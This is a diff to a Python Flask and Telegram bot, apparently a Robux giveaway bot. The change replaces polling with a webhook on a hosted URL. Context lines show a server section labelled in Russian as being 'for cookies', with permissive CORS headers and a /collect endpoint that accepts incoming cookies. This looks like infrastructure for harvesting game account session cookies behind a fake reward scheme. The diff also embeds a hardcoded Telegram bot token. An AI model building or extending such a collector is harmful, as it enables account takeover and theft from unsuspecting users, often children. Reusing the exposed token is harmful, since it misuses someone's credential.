@@ -3,7 +3,6 @@ import sqlite3
 from datetime import datetime
 from flask import Flask, request
 import time
-import threading
 
 TOKEN = '8684971280:AAH0V29u4vT382wAv28eGr2Bo2OXMi79ERI'
 bot = telebot.TeleBot(TOKEN)
@@ -218,6 +217,15 @@ def withdraw_amount(message):
         reply_markup=main_menu()
     )
 
+# === ВЕБХУК ===
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    json_data = request.get_json()
+    if json_data:
+        update = telebot.types.Update.de_json(json_data)
+        bot.process_new_updates([update])
+    return 'OK', 200
+
 # === СЕРВЕР ДЛЯ КУК ===
 @app.after_request
 def add_cors_headers(response):
@@ -239,22 +247,9 @@ def collect():
         return 'OK', 200
     return 'No cookie', 400
 
-@app.route('/register/<int:user_id>')
-def register(user_id):
-    users.add(user_id)
-    return 'Registered'
-
-@app.route('/users')
-def users_list():
-    return str(list(users))
-
-# === ЗАПУСК БОТА И СЕРВЕРА ===
-def run_bot():
-    bot.polling(non_stop=True)
-
+# === ЗАПУСК ===
 if __name__ == '__main__':
     create_table()
-    # Запускаем бота в отдельном потоке
-    threading.Thread(target=run_bot, daemon=True).start()
-    # Запускаем сервер
+    bot.remove_webhook()
+    bot.set_webhook(url='https://robux-bot-a6s3.onrender.com/webhook')
     app.run(host='0.0.0.0', port=10000)
